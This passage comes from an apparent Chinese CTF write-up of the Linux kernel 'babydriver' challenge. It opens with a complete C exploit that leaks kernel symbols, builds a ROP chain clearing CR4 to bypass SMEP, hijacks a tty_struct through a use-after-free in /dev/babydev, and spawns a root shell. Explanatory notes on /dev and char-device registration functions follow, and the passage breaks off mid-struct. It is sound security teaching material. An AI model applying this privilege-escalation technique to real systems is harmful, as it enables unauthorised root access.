class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = POP_RDI_RET;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRootPrivilige;</span><br><span class="line">    rop[p++] = SWAPGS_POP_RBP_RET;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = IRETQ_RET;</span><br><span class="line">    rop[p++] = getRootShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);<span class="comment">//这一步为什么要read??因为下一步写的时候要从开头写,如果直接填充到ops的话,那么中间很多重要信息就被覆盖了,所以先将原本的信息读出来,等会填充的时候就用这个填充,保证开头到目标之间的内容不被改变</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺带一提,本题覆盖cr4寄存器取消了smep保护,那么在获得了commint_creds和prepare_kernel_cred的地址后可以直接用户空间代码调用提权,最后着陆用户态spawn一个shell</p><h2 id="延拓"><a href="#延拓" class="headerlink" title="延拓"></a>延拓</h2><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>在Linux系统中，<code>/dev</code> 目录是一个特殊的目录，它包含了设备文件（device files）。设备文件是用于访问系统硬件设备或与内核通信的一种方式。<code>/dev</code> 目录中的设备文件允许用户和应用程序通过文件I/O的方式与硬件设备进行交互，这种文件I/O操作被视为与设备的输入输出（I/O）交互。</p><p>这些设备文件包括以下几类</p><p><strong>字符设备</strong></p><p><em>字符设备</em>是指每次与系统传输1个字符的设备。这些设备节点通常为传真,虚拟终端和串口调制解调器之类设备提供流通信服务，它通常不支持随机存取数据。</p><p>字符设备在实现时，大多不使用缓存器。系统直接从设备读取／写入每一个字符。</p><p><strong>块设备</strong></p><p><em>块设备</em>是指与系统间用块的方式移动数据的设备。这些设备节点通常代表可寻址设备，如硬盘、CD-ROM和内存区域。</p><p>块设备通常支持随机存取和寻址，并使用缓存器。操作系统为输入输出分配了缓存以存储一块数据。当程序向设备发送了读取或者写入数据的请求时，系统把数据中的每一个字符存储在适当的缓存中。当缓存被填满时，会采取适当的操作（把数据传走），而后系统清空缓存。</p><p><strong>伪设备</strong></p><p>在类Unix操作系统中，设备节点并不一定要对应物理设备。没有这种对应关系的设备是<em>伪设备</em>。操作系统运用了它们提供的多种功能。部分经常使用到的伪设备包括：</p><ul><li><p><code>/dev/null</code></p><p>接受并丢弃所有输入；即不产生任何输出。</p></li><li><p><code>/dev/full</code></p><p>永远在被填满状态的设备。</p></li><li><p><code>/dev/loop</code></p><p>Loop设备</p></li><li><p><code>/dev/zero</code></p><p>产生连续的NUL字符的流(数值为0)。</p></li><li><p><code>/dev/random</code></p><p>产生一个虚假随机的任意长度字符流。(Blocking)</p></li><li><p><code>/dev/urandom</code></p><p>产生一个虚假随机的任意长度字符流。(Non-Blocking)</p></li></ul><h3 id="dev-init"><a href="#dev-init" class="headerlink" title="dev_init"></a>dev_init</h3><p>简易分析下babydriver中出现的dev模块注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="alloc-chrdev-region"><a href="#alloc-chrdev-region" class="headerlink" title="alloc_chrdev_region"></a>alloc_chrdev_region</h4><p>首先出现的是alloc_chrdev_region函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">char_device_struct</span> *<span class="title">cd</span>;</span></span><br><span class="line">cd = __register_chrdev_region(<span class="number">0</span>, baseminor, count, name);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cd))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(cd);</span><br><span class="line">*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_chrdev_region</code> 是Linux内核中用于动态分配字符设备号的函数。在Linux系统中，字符设备是一种用于与字符设备驱动程序通信的设备类型，例如终端设备、串口设备等。每个字符设备都有一个唯一的设备号，该设备号由主设备号和次设备号组成。</p><p>参数说明：</p><ul><li><code>dev</code>：用于存储分配的设备号范围的变量（包括主设备号和起始的次设备号）。</li><li><code>baseminor</code>：起始的次设备号。</li><li><code>count</code>：要分配的设备号数量。</li><li><code>name</code>：设备名称，用于在<code>/proc/devices</code>中标识设备。</li></ul><p>对应的逆操作函数是<strong>unregister_chrdev_region</strong></p><h4 id="cdev-init"><a href="#cdev-init" class="headerlink" title="cdev_init"></a>cdev_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(cdev, <span class="number">0</span>, <span class="keyword">sizeof</span> *cdev);</span><br><span class="line">INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">cdev-&gt;ops = fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cdev_init</code> 函数的作用是初始化字符设备结构体 <code>cdev</code>。在Linux内核编程中，<code>cdev</code> 结构体代表字符设备，并通过该结构体来向内核注册字符设备。</p><p>参数说明：</p><ul><li><code>cdev</code>：要初始化的字符设备结构体。</li><li><code>fops</code>：与该字符设备关联的文件操作结构体，其中包含了指向驱动程序定义的处理函数的指针</li></ul><h4 id="cdev-add"><a href="#cdev-add" class="headerlink" title="cdev_add"></a>cdev_add</h4><p><code>cdev_add</code> 函数是Linux内核中用于向内核注册字符设备的函数。在使用字符设备时，首先需要创建并初始化 <code>struct cdev</code> 结构体，然后通过 <code>cdev_add</code> 将其注册到内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">p-&gt;dev = dev;</span><br><span class="line">p-&gt;count = count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(dev == WHITEOUT_DEV)) &#123;</span><br><span class="line">error = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = kobj_map(cdev_map, dev, count, <span class="literal">NULL</span>,</span><br><span class="line"> exact_match, exact_lock, p);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">kobject_get(p-&gt;kobj.parent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">kfree_const(p-&gt;kobj.name);</span><br><span class="line">p-&gt;kobj.name = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>p</code>：指向 <code>struct cdev</code> 结构体的指针，表示要注册的字符设备。</li><li><code>dev</code>：字符设备的设备号，包括主设备号和次设备号。</li><li><code>count</code>：设备的数量。通常为1，表示一个设备。</li></ul><p>对应的逆操作函数是<strong>cdev_del</strong></p><h4 id="class-create"><a href="#class-create" class="headerlink" title="_class_create"></a>_class_create</h4><p><code>_class_create</code> 函数是Linux内核中的一个函数，用于创建一个设备类（<code>struct class</code>）,并返回指向 <code>struct class</code> 结构体的指针。设备类是用于组织和管理设备的结构，它提供了一种将相关设备分组的机制，使得用户空间应用程序更容易识别和管理这些设备。</p><p>对应的逆操作函数是<strong>class_destroy</strong></p><h4 id="device-create"><a href="#device-create" class="headerlink" title="device_create"></a>device_create</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">     <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">va_list vargs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">va_start(vargs, fmt);</span><br><span class="line">dev = device_create_groups_vargs(class, parent, devt, drvdata, <span class="literal">NULL</span>,</span><br><span class="line">  fmt, vargs);</span><br><span class="line">va_end(vargs);</span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(device_create)</span><br></pre></td></tr></table></figure><p><code>device_create</code> 函数是 Linux 内核中用于创建字符设备节点（<u>设备文件</u>）的函数。这个函数通常与 <code>class_create</code> 配合使用，用于将字符设备注册到设备类并在 <code>/dev</code> 目录下创建相应的设备节点。</p><p>参数说明：</p><ul><li><code>class</code>：指向 <code>struct class</code> 结构体的指针，表示设备类。</li><li><code>parent</code>：父设备的指针，可以是 <code>NULL</code>。</li><li><code>devt</code>：设备号，包括主设备号和次设备号。</li><li><code>drvdata</code>：指向要关联到设备的私有数据的指针，通常为 <code>NULL</code>。</li><li><code>fmt</code>：用于创建设备节点的格式字符串。</li><li><code>...</code>：用于填充 <code>fmt</code> 字符串中的占位符。</li></ul><p><code>device_create</code> 的主要作用是创建一个字符设备节点，并将其注册到设备类中。通过这个函数，用户空间应用程序可以访问 <code>/dev</code> 目录下的设备节点，以与驱动程序通信。</p><p>对应的逆操作函数是<strong>device_destroy</strong></p><hr><p>看一下两个关键的结构体</p><p><strong>file_operations</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line"><span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line"><span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line"><span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">void</span> 